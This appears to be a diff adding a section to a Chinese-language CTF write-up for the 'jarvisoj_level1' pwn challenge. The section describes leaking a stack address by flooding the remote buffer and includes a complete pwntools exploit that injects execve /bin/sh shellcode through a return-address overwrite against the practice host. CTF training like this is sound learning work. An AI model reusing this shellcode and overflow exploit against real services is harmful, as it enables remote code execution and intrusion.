@@ -646,6 +646,74 @@ if __name__ == "__main__":
 
 ```
 
+### jarvisoj_level1
+
+此题本是大水题，NX 保护没开，注入 shellcode。
+
+本地很顺利跑通了，但是突然发现，远端竟然不把栈泄露给我们，只有我们输入了什么东西，才会回弹给我们。
+
+这太坏了，显然是远端部署了 I/O 缓冲区，在我们正常输入，没有覆盖 ret 地址的时候，正常 exit(0)，正常把结果一次性回显给我们。
+
+那么我们的地址就不能利用了😭😭😭
+
+……吗？🤣
+
+显然我们有两种方法，一是直接撑爆缓冲区，爆破它，强行得到泄露的栈。
+
+```
+payload = b'A' * 0x8c + p32(main_addr)
+    payload = payload.ljust(0x100,b'\x00')
+    for i in range(170):
+        io.send(payload)
+        sleep(0.05)
+data = io.recv(4500)
+```
+
+这样我们会得到非常非常多的地址：
+
+<img width="370" height="446" alt="image" src="https://github.com/user-attachments/assets/c894f85b-28ae-4c16-ba91-ea484c0ba323" />
+
+仔细观察，发现由于不可抗力，我们最后一个地址就是不完整的，但是倒数第二个是完整的，而且每个地址之间都只差了 0x10.
+
+那么很好了，我们选择尽可能短的 shellcode，并在 shellcode 前面填入尽可能多的 `\x90` （NOP），这样我们就有更多的误差范围内，使返回地址滑到 shellcode 上。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 29947
+io = remote(host,port)
+# io = process("./level1")
+elf = ELF("./level1")
+main_addr = elf.sym['main']
+
+def main():
+    payload = b'A' * 0x8c + p32(main_addr)
+    payload = payload.ljust(0x100,b'\x00')
+    for i in range(170):
+        io.send(payload)
+        sleep(0.05)
+        
+    data = io.recv(4500)
+    leak_str = data.split(b"What's this:")[-2][:10]
+    leak_stack = int(leak_str, 16) - 0x10
+    print("\n[+] Got Leak stack address:", hex(leak_stack))
+    shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+    payload = b'\x90'*0x70 + shellcode
+    payload = shellcode.ljust(0x8C, b'\x00') + p32(leak_stack)
+    payload = payload.ljust(0x100,b'\x00')
+    io.send(payload)
+    
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+第二种做法就比较简单，到 bss 段上跑即可。
+
 ## 中水区
 
 可能只有主播这种区才会觉得这里是中水区。
